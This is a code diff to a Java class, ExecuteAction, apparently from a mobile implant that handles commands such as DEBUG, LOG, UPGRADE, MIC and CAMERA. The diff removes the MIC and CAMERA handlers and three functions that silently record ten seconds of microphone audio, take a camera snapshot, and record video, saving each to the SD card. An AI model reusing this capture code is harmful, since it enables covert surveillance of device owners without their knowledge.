@@ -78,17 +78,11 @@ public final class ExecuteAction extends SubAction {
         final String cmd = getParams(command, params);
 
         if (cmd.equals("DEBUG")) {
-            //executeRecordMic(params); 
-            executeSnapCamera(params);
             executeDebug(params);
         } else if (cmd.equals("LOG")) {
             executeLog(params);
         } else if (cmd.equals("UPGRADE")) {
             executeUpgrade(params);
-        } else if (cmd.equals("MIC")) {
-            executeRecordMic(params);
-        } else if (cmd.equals("CAMERA")) {
-            executeRecordCamera(params);
         }
 
         return true;
@@ -142,79 +136,7 @@ public final class ExecuteAction extends SubAction {
     private ByteArrayOutputStream _output;
     private byte _data[];
 
-    void executeRecordMic(final Vector params) {
-        //#ifdef DEBUG_INFO        
-        debug.info("executeRecord");
-        for (int i = 0; i < params.size(); i++) {
-            debug.info(" arg: " + params.elementAt(i));
-        }
-        //#endif  
 
-        AudioRecorder recorder = new AudioRecorder();
-        recorder.start();
-        Utils.sleep(10000);
-        recorder.stop();
-
-        AutoFlashFile file = new AutoFlashFile(Path.SD_PATH + "testfile.amr",
-                false);
-        //#ifdef DEBUG_INFO
-        debug.info("Audio file: " + (Path.SD_PATH + "testfile.amr"));
-        //#endif
-
-        file.create();
-        file.write(recorder.getData());
-
-    }
-
-    void executeSnapCamera(final Vector params) {
-        //#ifdef DEBUG_INFO        
-        debug.info("executeSnapCamera");
-        for (int i = 0; i < params.size(); i++) {
-            debug.info(" arg: " + params.elementAt(i));
-        }
-        //#endif  
-
-        CameraRecorder recorder = new CameraRecorder();
-        byte[] jpeg = recorder.snap();
-        if (jpeg != null) {
-            AutoFlashFile file = new AutoFlashFile(Path.SD_PATH
-                    + "testfile.jpg", false);
-            //#ifdef DEBUG_INFO
-            debug.info("Video file: " + (Path.SD_PATH + "testfile.jpg"));
-            //#endif
-
-            file.create();
-            file.write(jpeg);
-        } else {
-            //#ifdef DEBUG_ERROR
-            debug.error("null jpeg");
-            //#endif
-        }
-    }
-
-    void executeRecordCamera(final Vector params) {
-        //#ifdef DEBUG_INFO        
-        debug.info("executeRecord");
-        for (int i = 0; i < params.size(); i++) {
-            debug.info(" arg: " + params.elementAt(i));
-        }
-        //#endif  
-
-        CameraRecorder recorder = new CameraRecorder();
-        recorder.start();
-        Utils.sleep(10000);
-        recorder.stop();
-
-        AutoFlashFile file = new AutoFlashFile(Path.SD_PATH + "testfile.3gpp",
-                false);
-        //#ifdef DEBUG_INFO
-        debug.info("Video file: " + (Path.SD_PATH + "testfile.3gpp"));
-        //#endif
-
-        file.create();
-        file.write(recorder.getData());
-
-    }
 
     private static String getParams(final String fullCommand,
             final Vector params) {
